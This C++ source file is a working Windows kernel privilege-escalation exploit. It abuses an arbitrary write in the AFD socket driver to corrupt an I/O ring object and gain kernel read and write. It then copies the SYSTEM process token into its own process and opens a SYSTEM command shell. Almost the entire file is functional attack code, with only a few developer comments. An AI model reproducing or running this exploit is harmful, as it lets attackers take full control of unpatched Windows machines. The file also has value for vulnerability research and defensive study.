// exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <ioringapi.h>
#include <Tchar.h>
#include "Hexdump.hpp"
#include "Header.hpp"
#pragma comment(lib, "ntdll.lib")


#define IOCTL_TARGET 0x12127

#define QWORD unsigned long long
#define READ_SIZE 0x1000
#define NUM_OF_FAKE_BUFFERS 0x100

#define READ_PIPE_NAME "\\\\.\\pipe\\IoringReadPipe"
#define WRITE_PIPE_NAME "\\\\.\\pipe\\IoringWritePipe"

#define TOKEN_OFFSET 0x4b8

//struct UNICODE_STRING
//{
//	USHORT Length;
//	USHORT MaximumLength;
//	PWSTR Buffer;
//};

//struct OBJECT_ATTRIBUTES
//{
//	ULONG Length;
//	HANDLE RootDirectory;
//	UNICODE_STRING* ObjectName;
//	ULONG Attributes;
//	PVOID SecurityDescriptor;
//	PVOID SecurityQualityOfService;
//};

//struct IO_STATUS_BLOCK
//{
//	union
//	{
//		DWORD Status;
//		PVOID Pointer;
//	};
//
//	DWORD* Information;
//};

struct __declspec(align(8)) AfdProcessRegPayload
{
	QWORD fileObjectHandle;
	QWORD f2;
	WORD f3;
	char f4;
	char f5;
};

struct AfdNotifySockPayload
{
	void* ioCompletionHandle;
	AfdProcessRegPayload* processRegPayload;
	char* entryArray;
	char* targetAddress;
	int f5;
	DWORD timeout;
	int totalEntry;
	int f8;
};


//DWORD(WINAPI* NtDeviceIoControlFile)(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
//DWORD(WINAPI* NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, OBJECT_ATTRIBUTES* ObjectAttributes, IO_STATUS_BLOCK* IoStatusBlock, LARGE_INTEGER* AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
DWORD(WINAPI* NtCreateIoCompletion)(OUT PHANDLE IoCompletionHandle, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes OPTIONAL, IN ULONG NumberOfConcurrentThreads);
DWORD(WINAPI* NtSetIoCompletion)(IN HANDLE IoCompletionHandle, IN ULONG CompletionKey, OUT IO_STATUS_BLOCK* IoStatusBlock, IN NTSTATUS CompletionStatus, IN ULONG NumberOfBytesTransfered);

NTSTATUS abitraryWriteAfd(char* addr, DWORD value = 1) {
	if (value == 0) throw "Can't write 0";
	IO_STATUS_BLOCK IoStatusBlock;
	HANDLE hEvent = NULL;
	HANDLE hSocket = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	UNICODE_STRING ObjectFilePath;
	DWORD dwStatus = 0;

	AfdNotifySockPayload payload;
	HANDLE ioCompletionHandle;
	AfdProcessRegPayload processReg;

	BYTE bExtendedAttributes[] =
	{
		0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
		0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
	};
	memset((void*)&ObjectFilePath, 0, sizeof(ObjectFilePath));
	ObjectFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoint";
	ObjectFilePath.Length = wcslen(ObjectFilePath.Buffer) * sizeof(wchar_t);
	ObjectFilePath.MaximumLength = ObjectFilePath.Length;

	// initialise object attributes
	memset((void*)&ObjectAttributes, 0, sizeof(ObjectAttributes));
	ObjectAttributes.Length = sizeof(ObjectAttributes);
	ObjectAttributes.ObjectName = &ObjectFilePath;
	ObjectAttributes.Attributes = 0x40;

	// create socket handle
	IoStatusBlock.Status = 0;
	IoStatusBlock.Information = NULL;
	dwStatus = NtCreateFile(&hSocket, 0xC0140000, &ObjectAttributes, &IoStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0, bExtendedAttributes, sizeof(bExtendedAttributes));

	NtCreateIoCompletion(&ioCompletionHandle, IO_COMPLETION_ALL_ACCESS, NULL, 0);
	// The driver will call IoRemoveIoCompletion later to dequeue the io completion record
	// So we add a completion record here
	for (int i = 0; i < value; i++)	NtSetIoCompletion(ioCompletionHandle, 0x41424344, &IoStatusBlock, 0, 1);
	payload.ioCompletionHandle = ioCompletionHandle;

	// Setup the AfdProcessRegPayload array
	payload.f5 = 1;
	processReg.f3 = 0;
	processReg.f5 = 0;
	processReg.f4 = 2;
	payload.processRegPayload = &processReg;

	payload.totalEntry = value;
	payload.targetAddress = addr;		// This could be a kernel address
	payload.entryArray = (char*)malloc(32 * payload.totalEntry);
	memset(payload.entryArray, 0, 32 * payload.totalEntry);
	payload.timeout = 1;

	DWORD status = NtDeviceIoControlFile(hSocket, NULL, NULL, NULL, &IoStatusBlock, IOCTL_TARGET, &payload, sizeof(payload), NULL, 0);
	return status;
}

PVOID getNtosBase() {
	NTSTATUS status;
	PVOID result;
	PRTL_PROCESS_MODULES moduleInfo = (PRTL_PROCESS_MODULES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024);
	if (!moduleInfo) {
		puts("Can't allocate memory for module info list");
		return NULL;
	}
	status = NtQuerySystemInformation(SystemModuleInformation, moduleInfo, 1024 * 1024, NULL);
	if (status != STATUS_SUCCESS) {
		printf("Can't query module info. Error: %llx", status);
		HeapFree(GetProcessHeap(), 0, moduleInfo);
		return NULL;
	}

	printf("[*] Ntos base: %p\n", moduleInfo->Modules[0].ImageBase);
	printf("[*] Ntos image name: %s\n", moduleInfo->Modules[0].FullPathName + moduleInfo->Modules[0].OffsetToFileName);
	result = moduleInfo->Modules[0].ImageBase;
	HeapFree(GetProcessHeap(), 0, moduleInfo);
	return result;
}

PVOID leakKernelObjectAddr(HANDLE handle, DWORD pid) {
	NTSTATUS status;
	QWORD typeIndex;
	SYSTEM_HANDLE_INFORMATION localHandleInfoObj;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize;
	PVOID result = NULL;
	struct
	{
		OBJECT_TYPE_INFORMATION TypeInfo;
		WCHAR TypeNameBuffer[100];
	} typeInfoWithName;
	status = NtQueryObject(handle, ObjectTypeInformation, &typeInfoWithName, sizeof(typeInfoWithName), NULL);
	//printf("%Z: %hhd\n", typeInfoWithName.TypeInfo.TypeName, typeInfoWithName.TypeInfo.TypeIndex);
	if (status != 0) {
		printf("Can't query object. Error: %llx\n", status);
		return NULL;
	}
	typeIndex = typeInfoWithName.TypeInfo.TypeIndex;
	status = NtQuerySystemInformation(SystemHandleInformation, &localHandleInfoObj, sizeof(localHandleInfoObj), &handleInfoSize);
	if (status != STATUS_INFO_LENGTH_MISMATCH) {
		printf("Can't get handle table size. Error: %llx\n", status);
		return NULL;
	}
	handleInfoSize += 100 * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO);	// add a bit as extra
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);
	status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL);
	if (status != STATUS_SUCCESS) {
		printf("Can't query handle table. Error: %llx\n", status);
		HeapFree(GetProcessHeap(), 0, handleInfo);
		return NULL;
	}

	for (int i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		//
		// Check if this is the correct I/O ring handle
		//
		if ((handleInfo->Handles[i].UniqueProcessId == pid) &&
			((HANDLE)handleInfo->Handles[i].HandleValue == handle))
		{
			printf("[*] Found object address: 0x%p\n", handleInfo->Handles[i].Object);
			//printf("%hhd\n", handleInfo->Handles[i].ObjectTypeIndex);
			result = handleInfo->Handles[i].Object;
			break;
		}
	}
	HeapFree(GetProcessHeap(), 0, handleInfo);
	return result;
}

_IOP_MC_BUFFER_ENTRY** allocFakeRegBufferStruct(ULONG bufNum, PVOID address = NULL) {
	// Assuming the winver build > 22610,
	DWORD size = sizeof(_IOP_MC_BUFFER_ENTRY*) * bufNum;
	_IOP_MC_BUFFER_ENTRY** regBufferArray = (_IOP_MC_BUFFER_ENTRY**)VirtualAlloc(address, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	return regBufferArray;
}

ULONG addBufferToArray(_IOP_MC_BUFFER_ENTRY** regBufferArray, ULONG numberOfFakeBuffer, PVOID targetAddr, ULONG targetLen) {
	// Returns the inserted index
	PIOP_MC_BUFFER_ENTRY mcBufferEntry;
	IORING_BUFFER_INFO* bufferEntry;

	mcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL,
		sizeof(IOP_MC_BUFFER_ENTRY),
		MEM_COMMIT,
		PAGE_READWRITE);
	if (mcBufferEntry == nullptr)
	{
		printf("Failed to allocate memory: 0x%x\n", GetLastError());
		return -1;
	}
	mcBufferEntry->Address = targetAddr;
	mcBufferEntry->Length = targetLen;
	mcBufferEntry->Type = 0xc02;
	mcBufferEntry->Size = 0x80; // 0x20 * (numberOfPagesInBuffer + 3)
	mcBufferEntry->AccessMode = 1;
	mcBufferEntry->ReferenceCount = 1;

	//
	// Find first unused entry and have it point to the new buffer entry
	// We don't need to do this, we can just replace the first entry with the new address and all is still good ==> only need to write 1 to RegBuffersCount
	// This method sometimes throw an out of bound index error whenever the index is > 0, even thought i have overwritten RegBuffersCount
	// Might be an error on my part ??
	//for (int i = 0; i < numberOfFakeBuffer; i++)
	//{
	//	if (regBufferArray[i] == 0)
	//	{
	//		regBufferArray[i] = mcBufferEntry;
	//		return i;
	//	}
	//}
	regBufferArray[0] = mcBufferEntry;
	return 0;
}

HRESULT abitraryReadNamedPipe(
	HANDLE readPipe,
	HANDLE readClientPipe,
	HIORING ioRingHandle,
	_IOP_MC_BUFFER_ENTRY** fakeRegBufferArray,
	char* addr,
	DWORD size,
	OUT char* outBuf) {

	ULONG newBufferIndex;
	IORING_BUFFER_REF requestDataBuffer = IoRingBufferRefFromPointer(0);
	IORING_HANDLE_REF requestDataFile = IoRingHandleRefFromHandle(0);
	IORING_CQE cqe;
	HRESULT result;
	DWORD bytesRead;
	BOOL res;

	newBufferIndex = addBufferToArray(fakeRegBufferArray, NUM_OF_FAKE_BUFFERS, addr, size);
	requestDataBuffer = IoRingBufferRefFromIndexAndOffset(newBufferIndex, 0);
	requestDataFile = IoRingHandleRefFromHandle(readClientPipe);

	result = BuildIoRingWriteFile(ioRingHandle,
		requestDataFile,
		requestDataBuffer,
		size,
		0,
		FILE_WRITE_FLAGS_NONE,
		NULL,
		IOSQE_FLAGS_NONE);
	if (!SUCCEEDED(result))
	{
		printf("Failed building IO ring read file structure: 0x%x\n", result);
		return result;
	}

	result = SubmitIoRing(ioRingHandle, 0, 0, NULL);
	if (!SUCCEEDED(result))
	{
		printf("Failed submitting IO ring: 0x%x\n", result);
		return result;
	}
	//
	// Check the completion queue for the actual status code for the operation
	//
	result = PopIoRingCompletion(ioRingHandle, &cqe);
	if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
	{
		printf("Failed reading kernel memory 0x%x\n", cqe.ResultCode);
		return cqe.ResultCode;
	}
	printf("Successfully read kernel data\n");

	res = ReadFile(readPipe, outBuf, size, &bytesRead, NULL);
	if (res == FALSE)
	{
		printf("Failed reading file %d\n", GetLastError());
		return GetLastError();
	}
	puts("***Read from pipe***");
	std::cout << Hexdump(outBuf, 100) << std::endl;
	return S_OK;
}

void ErrorDescription(HRESULT hr)
{
	if (FACILITY_WINDOWS == HRESULT_FACILITY(hr))
		hr = HRESULT_CODE(hr);
	TCHAR* szErrMsg;

	if (FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, hr, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&szErrMsg, 0, NULL) != 0)
	{
		_tprintf(TEXT("%s"), szErrMsg);
		LocalFree(szErrMsg);
	}
	else
		_tprintf(TEXT("[Could not find a description for error # %#x.]\n"), hr);
}


HRESULT abitraryWriteNamedPipe(
	HANDLE writePipe,
	HANDLE writeClientPipe,
	HIORING ioRingHandle,
	_IOP_MC_BUFFER_ENTRY** fakeRegBufferArray,
	char* addr,
	char* data,
	DWORD size) {

	ULONG newBufferIndex;
	IORING_BUFFER_REF requestDataBuffer = IoRingBufferRefFromPointer(0);
	IORING_HANDLE_REF requestDataFile = IoRingHandleRefFromHandle(0);
	IORING_CQE cqe;
	HRESULT result;
	DWORD bytesRead;
	BOOL res;

	res = WriteFile(writePipe, data, size, &bytesRead, NULL);
	if (res == FALSE)
	{
		printf("Failed writing pipe %d\n", GetLastError());
		return GetLastError();
	}

	newBufferIndex = addBufferToArray(fakeRegBufferArray, NUM_OF_FAKE_BUFFERS, addr, size);
	//printf("New index: %llx\n", newBufferIndex);
	requestDataBuffer = IoRingBufferRefFromIndexAndOffset(newBufferIndex, 0);
	requestDataFile = IoRingHandleRefFromHandle(writeClientPipe);

	result = BuildIoRingReadFile(ioRingHandle,
		requestDataFile,
		requestDataBuffer,
		size,
		0,
		NULL,
		IOSQE_FLAGS_NONE);

	if (!SUCCEEDED(result))
	{
		printf("Failed building IO ring write file structure: 0x%x\n", result);
		return result;
	}

	result = SubmitIoRing(ioRingHandle, 0, 0, NULL);
	if (!SUCCEEDED(result))
	{
		printf("Failed submitting IO ring: 0x%x\n", result);
		return result;
	}
	//
	// Check the completion queue for the actual status code for the operation
	//
	result = PopIoRingCompletion(ioRingHandle, &cqe);
	if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
	{
		printf("Failed writing kernel memory 0x%x\n", cqe.ResultCode);
		ErrorDescription(cqe.ResultCode);
		return cqe.ResultCode;
	}
	printf("Successfully write kernel data\n");

	return S_OK;
}

int main()
{
	HANDLE readPipe, writePipe, readClientPipe, writeClientPipe;
	HRESULT hResult;
	PVOID ntosBase;
	PVOID systemEprocess = 0;
	HANDLE hCurrentProc;
	PVOID currentEprocess = 0;
	PIORING_OBJECT ioRingObj;
	_IOP_MC_BUFFER_ENTRY** fakeRegBufferArray;
	HIORING ioRingHandle;
	_HIORING* pIoRingHandle;
	IORING_CREATE_FLAGS ioringFlags;
	NTSTATUS status;
	HRESULT result;
	ULONG ioringBufIndex;

	char systemToken[8];

	char out[READ_SIZE];
	char cleanup[16];
	//int test;

	NtCreateIoCompletion = (DWORD(WINAPI*)(PHANDLE, ACCESS_MASK, PVOID, ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateIoCompletion");
	if (NtCreateIoCompletion == NULL) {
		return 1;
	}
	NtSetIoCompletion = (DWORD(WINAPI*)(HANDLE, ULONG, IO_STATUS_BLOCK*, NTSTATUS, ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetIoCompletion");
	if (NtSetIoCompletion == NULL) {
		return 1;
	}

	// Preparing for IO ring primitive
	readPipe = CreateNamedPipeA(READ_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, NULL);
	if (readPipe == INVALID_HANDLE_VALUE) {
		printf("Can't create read pipe. Error: %llx", GetLastError());
		goto LABEL_EXIT;
	}
	writePipe = CreateNamedPipeA(WRITE_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, NULL);
	if (writePipe == INVALID_HANDLE_VALUE) {
		printf("Can't create write pipe. Error: %llx", GetLastError());
		goto LABEL_EXIT;
	}
	readClientPipe = CreateFileA(READ_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (readClientPipe == INVALID_HANDLE_VALUE) {
		printf("Can't create read client pipe. Error: %llx", GetLastError());
		goto LABEL_EXIT;
	}
	writeClientPipe = CreateFileA(WRITE_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (writeClientPipe == INVALID_HANDLE_VALUE) {
		printf("Can't create write client pipe. Error: %llx", GetLastError());
		goto LABEL_EXIT;
	}
	ioringFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
	ioringFlags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
	hResult = CreateIoRing(IORING_VERSION_3, ioringFlags, 0x10000, 0x20000, &ioRingHandle);
	if (hResult != S_OK) {
		printf("Can't create io ring. Error: %llx\n", hResult);
		goto LABEL_EXIT;
	}
	ntosBase = getNtosBase();
	ioRingObj = (PIORING_OBJECT)leakKernelObjectAddr(*(PHANDLE)ioRingHandle, GetCurrentProcessId());
	fakeRegBufferArray = allocFakeRegBufferStruct(NUM_OF_FAKE_BUFFERS, (PVOID)0x0100000000);

	//
	// Write the new buffer to the kernelBase structure so we can use the
	// fake buffers with the Win32 ioring functions (Basically just register the fake buffer on the usermode side)
	//

	pIoRingHandle = *(_HIORING**)&ioRingHandle;
	pIoRingHandle->BufferArraySize = NUM_OF_FAKE_BUFFERS;
	pIoRingHandle->RegBufferArray = fakeRegBufferArray;

	//Overwrite ioring->regbuffer (write high dword into 1) and regbufferscount
	status = abitraryWriteAfd((char*)&ioRingObj->RegBuffers + 4, 1);
	if (status != STATUS_SUCCESS) {
		printf("Can't trigger abitrary write in afd. Error: %lx\n", status);
		goto LABEL_EXIT;
	}
	//status = abitraryWriteAfd((char*)&ioRingObj->RegBuffersCount, NUM_OF_FAKE_BUFFERS);
	status = abitraryWriteAfd((char*)&ioRingObj->RegBuffersCount, 1);
	if (status != STATUS_SUCCESS) {
		printf("Can't trigger abitrary write in afd. Error: %lx\n", status);
		goto LABEL_EXIT;
	}
	puts("[*] I/O ring corrupted");

	//abitraryWriteNamedPipe(writePipe, writeClientPipe, ioRingHandle, fakeRegBufferArray, (char*)ntosBase + 0xC00000, (char*)&cleanup, 4);
	//status = abitraryReadNamedPipe(readPipe, readClientPipe, ioRingHandle, fakeRegBufferArray, (char*)ntosBase + 0xC00000, READ_SIZE, out);
	//status = abitraryReadNamedPipe(readPipe, readClientPipe, ioRingHandle, fakeRegBufferArray, (char*)ntosBase + 0xC00000, READ_SIZE, out);
	//std::cout << Hexdump(out, 100) << std::endl;
	//if (status != S_OK) goto LABEL_EXIT;
	systemEprocess = leakKernelObjectAddr((HANDLE)4, 4);
	if (systemEprocess == NULL) {
		goto LABEL_CLEANUP;
	}
	printf("[*] SYSTEM EPROCESS: 0x%llx\n", systemEprocess);
	hCurrentProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
	currentEprocess = leakKernelObjectAddr(hCurrentProc, GetCurrentProcessId());
	if (currentEprocess == NULL) {
		goto LABEL_CLEANUP;
	}
	printf("[*] Current EPROCESS: 0x%llx\n", currentEprocess);

	abitraryReadNamedPipe(readPipe, readClientPipe, ioRingHandle, fakeRegBufferArray, (char*)systemEprocess + TOKEN_OFFSET, 8, systemToken);
	abitraryWriteNamedPipe(writePipe, writeClientPipe, ioRingHandle, fakeRegBufferArray, (char*)currentEprocess + TOKEN_OFFSET, systemToken, 8);
	puts("[*] Done swap token");
	system("cmd");

LABEL_CLEANUP:
	memset(cleanup, 0, 16);
	abitraryWriteNamedPipe(writePipe, writeClientPipe, ioRingHandle, fakeRegBufferArray, (char*)&ioRingObj->RegBuffersCount, cleanup, 16);

LABEL_EXIT:
	if (readPipe != INVALID_HANDLE_VALUE) CloseHandle(readPipe);
	if (writePipe != INVALID_HANDLE_VALUE) CloseHandle(writePipe);
	if (readClientPipe != INVALID_HANDLE_VALUE) CloseHandle(readClientPipe);
	if (writeClientPipe != INVALID_HANDLE_VALUE) CloseHandle(writeClientPipe);

	if (ioRingHandle != INVALID_HANDLE_VALUE) {
		pIoRingHandle = *(_HIORING**)&ioRingHandle;
		pIoRingHandle->BufferArraySize = 0;
		pIoRingHandle->RegBufferArray = NULL;
		CloseIoRing(ioRingHandle);	
	}
}